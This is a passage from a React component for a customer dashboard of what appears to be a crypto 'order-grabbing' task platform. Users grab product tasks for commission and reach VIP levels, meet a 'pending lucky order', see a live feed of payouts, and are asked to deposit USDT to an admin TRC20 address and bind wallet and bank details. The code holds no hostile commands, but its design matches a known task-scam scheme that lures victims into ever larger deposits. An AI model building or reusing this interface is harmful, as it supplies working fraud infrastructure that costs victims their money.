              <h3 className="text-xs font-extrabold text-[#f3e5ab]">📈 LIVE TRANSACTIONS</h3>
              <div className="space-y-1.5">
                {liveFeed.map((tx) => (
                  <div key={tx.id} className="p-2 bg-[#18150a] border border-[#d4af37]/30 rounded-xl flex items-center justify-between text-xs">
                    <span className="font-bold text-white text-[10px]">{tx.user}</span>
                    <span className="font-mono font-black text-[#50e3c2] text-[11px]">+${tx.amount} USDT</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* SUPPORT TAB */}
        {activeTab === 'support' && (
          <div className="space-y-4">
            <div className="bg-[#0b0c10] border-2 border-[#d4af37] p-4 rounded-3xl shadow-2xl space-y-4">
              <h2 className="text-base font-extrabold text-[#f3e5ab] text-center">Customer Support Center</h2>
              <div className="space-y-2 max-h-60 overflow-y-auto">
                {chatMessages.map((msg) => (
                  <div key={msg.id} className={`p-2 rounded-xl text-xs ${msg.is_admin ? 'bg-black text-gray-200' : 'bg-[#d4af37] text-black font-bold ml-auto'}`}>
                    <p>{msg.message}</p>
                    <span className="text-[8px] opacity-70 block text-right">{formatDateWithTime(msg.created_at)}</span>
                  </div>
                ))}
              </div>
              <form onSubmit={handleSendMessage} className="flex gap-2">
                <input type="text" value={inputMessage} onChange={(e) => setInputMessage(e.target.value)} placeholder="Message..." className="flex-1 bg-black border border-[#d4af37] rounded-xl px-3 py-2 text-xs text-white" />
                <button type="submit" className="px-4 py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Send</button>
              </form>
            </div>
          </div>
        )}

        {/* GRABBING TAB */}
        {activeTab === 'grabbing' && (
          <div className="space-y-4">
            <div className="bg-[#0b0c10] text-white p-6 rounded-3xl border-2 border-[#d4af37]/70 shadow-xl text-center space-y-1">
              <p className="text-[10px] font-bold text-[#d4af37] uppercase tracking-widest">ACCOUNT BALANCE</p>
              <h2 className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#f3e5ab] via-white to-[#d4af37]">
                ${balance.toFixed(2)} <span className="text-sm font-bold text-[#d4af37]">USDT</span>
              </h2>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="bg-[#0b0c10] p-4 rounded-2xl border border-[#d4af37]/50 shadow-md space-y-1">
                <div className="text-sm font-black text-white">25</div>
                <p className="text-[10px] text-gray-400 font-medium">Total Tasks</p>
              </div>
              <div className="bg-[#0b0c10] p-4 rounded-2xl border border-[#d4af37]/50 shadow-md space-y-1">
                <div className="text-sm font-black text-white">{completedTasks}/25</div>
                <p className="text-[10px] text-gray-400 font-medium">Completed</p>
              </div>
              <div className="bg-[#0b0c10] p-4 rounded-2xl border border-[#d4af37]/50 shadow-md space-y-1">
                <div className="text-sm font-black text-[#50e3c2]">${todayCommission.toFixed(2)}</div>
                <p className="text-[10px] text-gray-400 font-medium">Today Earnings</p>
              </div>
              <div className="bg-[#0b0c10] p-4 rounded-2xl border border-[#d4af37]/50 shadow-md space-y-1">
                <div className="text-xs font-bold text-[#f3e5ab] line-clamp-1">{activeVipLevel}</div>
                <p className="text-[10px] text-gray-400 font-medium">Status</p>
              </div>
            </div>

            <div className="bg-[#0b0c10] p-6 rounded-3xl border-2 border-[#d4af37]/70 shadow-2xl text-center space-y-4">
              <button
                onClick={handleGrabTask}
                disabled={isGrabbing}
                className="w-full py-4 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] hover:brightness-110 text-black font-black text-sm rounded-2xl shadow-[0_0_25px_rgba(212,175,55,0.5)] transition uppercase tracking-wider"
              >
                {isGrabbing ? 'Matching Order Tasks...' : (currentTask && currentTask.id > completedTasks) ? 'VIEW PENDING LUCKY ORDER' : 'START GRABBING'}
              </button>
            </div>
          </div>
        )}

        {/* RECORDS TAB */}
        {activeTab === 'records' && (
          <div className="space-y-4">
            <div className="bg-[#0b0c10] p-6 rounded-3xl border border-[#d4af37]/60 shadow-xl space-y-4">
              <h2 className="text-base font-extrabold text-[#f3e5ab]">Task Records History</h2>
              <div className="space-y-2">
                {recordsList.map((rec, i) => (
                  <div key={i} className="p-3 bg-[#18150a] border border-[#d4af37]/30 rounded-2xl flex justify-between items-center text-xs">
                    <div>
                      <p className="font-bold text-white">{rec.name}</p>
                      <p className="text-[10px] text-gray-400">{rec.store}</p>
                    </div>
                    <span className="font-mono font-bold text-[#50e3c2]">+${rec.commission.toFixed(2)}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

      </div>

      {/* BOTTOM NAVIGATION BAR */}
      <div className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-[#0b0c10]/95 border-t-2 border-[#d4af37]/60 backdrop-blur-2xl py-2 px-3 flex justify-around items-center z-50">
        <button onClick={() => setActiveTab('home')} className={`flex flex-col items-center ${activeTab === 'home' ? 'text-[#f3e5ab]' : 'text-gray-400'}`}>
          <span className="text-lg">🏠</span><span className="text-[9px] font-bold">Home</span>
        </button>
        <button onClick={() => setActiveTab('support')} className={`flex flex-col items-center ${activeTab === 'support' ? 'text-[#f3e5ab]' : 'text-gray-400'}`}>
          <span className="text-lg">🎧</span><span className="text-[9px] font-bold">Support</span>
        </button>
        <button onClick={() => setActiveTab('grabbing')} className={`flex flex-col items-center ${activeTab === 'grabbing' ? 'text-[#f3e5ab]' : 'text-gray-400'}`}>
          <span className="text-lg">⚡</span><span className="text-[9px] font-bold">Grabbing</span>
        </button>
        <button onClick={() => setActiveTab('records')} className={`flex flex-col items-center ${activeTab === 'records' ? 'text-[#f3e5ab]' : 'text-gray-400'}`}>
          <span className="text-lg">📋</span><span className="text-[9px] font-bold">Records</span>
        </button>
        <button onClick={() => setActiveTab('mine')} className={`flex flex-col items-center ${activeTab === 'mine' ? 'text-[#f3e5ab]' : 'text-gray-400'}`}>
          <span className="text-lg">👤</span><span className="text-[9px] font-bold">Profile</span>
        </button>
      </div>

      {/* FULL PAGE TASK MODAL */}
      {showFullPageTask && currentTask && (
        <div className="fixed inset-0 bg-[#06060a] z-50 flex flex-col p-4 overflow-y-auto font-sans text-white border-4 border-[#d4af37]/30 shadow-2xl">
          <div className="flex justify-between items-center py-3 border-b border-[#332a15]">
            <button onClick={() => setShowFullPageTask(false)} className="text-xs bg-[#18150a] border border-[#d4af37]/50 text-[#f3e5ab] font-bold px-3 py-2 rounded-xl">← Back</button>
            <h2 className="text-sm font-extrabold text-[#f3e5ab]">Product Task #{currentTask?.id}</h2>
            <button onClick={() => setShowFullPageTask(false)} className="text-xs bg-[#18150a] border border-[#d4af37]/50 text-[#f3e5ab] font-bold px-3 py-2 rounded-xl">✕</button>
          </div>

          <div className="space-y-4 my-4 max-w-md mx-auto w-full">
            <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-2xl p-3 flex gap-3 shadow-lg">
              <div className="w-1/2 aspect-square rounded-xl bg-black border border-[#332a15] overflow-hidden flex items-center justify-center">
                {currentTask.imageUrl ? <img src={currentTask.imageUrl} alt={currentTask.name} className="w-full h-full object-contain" /> : <span className="text-xs text-gray-500">No image</span>}
              </div>
              <div className="w-1/2 flex flex-col justify-between py-1">
                <div>
                  <div className="text-[10px] uppercase text-[#d4af37] font-bold">👑 {currentTask.store}</div>
                  <h3 className="text-sm font-bold text-white leading-tight mt-1">{currentTask.name}</h3>
                </div>
                <div className="text-base font-black font-mono text-[#f3e5ab]">${Math.abs(Number(currentTask.price || 0)).toFixed(2)}</div>
              </div>
            </div>

            <button
              onClick={handleConfirmTask}
              className="w-full py-4 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] text-black font-black text-sm rounded-2xl shadow-lg uppercase tracking-wider flex items-center justify-center gap-2 hover:brightness-110 transition"
            >
              <span>📋</span><span>CONTINUE TASKS</span><span>➔</span>
            </button>
          </div>
        </div>
      )}

      {/* DEPOSIT MODAL */}
      {showDepositModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">Deposit USDT Funds</h3>
            <p className="text-xs font-mono text-center text-white break-all">{adminTrc20DepositAddress}</p>
            <button onClick={() => copyToClipboard(adminTrc20DepositAddress)} className="w-full py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Copy Address</button>
            
            <div className="grid grid-cols-4 gap-1.5">
              {quickDepositAmounts.map((amt) => (
                <button key={amt} type="button" onClick={() => setDepositAmount(amt.toString())} className="py-1 bg-[#18150a] border border-[#d4af37]/30 text-[#f3e5ab] text-[10px] font-bold rounded-lg">
                  ${amt}
                </button>
              ))}
            </div>

            <form onSubmit={handleDepositSubmit} className="space-y-3">
              <input type="number" placeholder="Enter amount" value={depositAmount} onChange={(e) => setDepositAmount(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <div className="flex gap-2">
                <button type="button" onClick={() => setShowDepositModal(false)} className="flex-1 py-2 bg-[#18150a] border text-xs text-white rounded-xl">Cancel</button>
                <button type="submit" className="flex-1 py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Submit</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* WITHDRAW MODAL */}
      {showWithdrawModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">Withdraw Funds</h3>
            <form onSubmit={handleWithdrawSubmit} className="space-y-3">
              <input type="number" placeholder="Amount ($)" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <input type="password" placeholder="Password" value={withdrawPasswordInput} onChange={(e) => setWithdrawPasswordInput(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <div className="flex gap-2">
                <button type="button" onClick={() => setShowWithdrawModal(false)} className="flex-1 py-2 bg-[#18150a] border text-xs text-white rounded-xl">Cancel</button>
                <button type="submit" className="flex-1 py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Submit</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* WALLET BIND MODAL */}
      {showWalletBindModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">Wallet & Bank Binding</h3>
            <form onSubmit={handleWalletBindSubmit} className="space-y-3">
              <input type="text" placeholder="TRC20 Address" value={trc20Address} disabled={isWalletAlreadyBound} onChange={(e) => setTrc20Address(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <input type="text" placeholder="Bank Name" value={bankName} disabled={isWalletAlreadyBound} onChange={(e) => setBankName(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <div className="flex gap-2">
                <button type="button" onClick={() => setShowWalletBindModal(false)} className="flex-1 py-2 bg-[#18150a] border text-xs text-white rounded-xl">Cancel</button>
                {!isWalletAlreadyBound && <button type="submit" className="flex-1 py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Save</button>}
              </div>
            </form>
          </div>
        </div>
      )}

      {/* SETTINGS MODAL */}
      {showSettingsModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">Update Profile</h3>
            <form onSubmit={handleSecurityUpdateSubmit} className="space-y-3">
              <input type="email" placeholder="Email" value={userEmail} onChange={(e) => setUserEmail(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <input type="text" placeholder="Phone" value={userPhone} onChange={(e) => setUserPhone(e.target.value)} className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white" />
              <div className="flex gap-2">
                <button type="button" onClick={() => setShowSettingsModal(false)} className="flex-1 py-2 bg-[#18150a] border text-xs text-white rounded-xl">Cancel</button>
                <button type="submit" className="flex-1 py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Save</button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* INFO MODAL */}
      {infoModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab]">{infoModal.title}</h3>
            <p className="text-xs text-gray-300 leading-relaxed whitespace-pre-line">{infoModal.text}</p>
            <button onClick={() => setInfoModal(null)} className="w-full py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Close</button>
          </div>
        </div>
      )}

      {/* CERTIFICATE MODAL */}
      {showCertModal && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-lg z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-4 border-[#d4af37] rounded-3xl p-6 w-full max-w-md space-y-4 text-center">
            <h4 className="text-xs font-black text-white uppercase">CERTIFICATE OF PROFESSIONAL EXPERTISE</h4>
            <button onClick={() => setShowCertModal(false)} className="w-full py-2 bg-[#d4af37] text-black font-bold text-xs rounded-xl">Close</button>
          </div>
        </div>
      )}

      {/* HISTORY MODAL */}
      {showHistoryModal && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4">
            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center uppercase">{showHistoryModal} History</h3>
            <div className="space-y-2 max-h-60 overflow-y-auto">
              {(showHistoryModal === 'deposit' ? depositHistory : withdrawHistory).map((item: any) => (
                <div key={item.id} className="p-3 bg-[#18150a] border border-[#d4af37]/30 rounded-xl flex justify-between text-xs">
                  <div>
                    <span className="text-white font-bold">${item.amount} USDT</span>
                    <span className="text-[9px] text-gray-400 block">{formatDateWithTime(item.created_at)}</span>
                  </div>
                  <span className="text-[#f3e5ab] font-bold uppercase">{item.status}</span>
                </div>
              ))}
            </div>
            <button onClick={() => setShowHistoryModal(null)} className="w-full py-2 bg-[#18150a] border text-white text-xs font-bold rounded-xl">Close</button>
          </div>
        </div>
      )}

    </div>
  );
};

export default CustomerDashboard;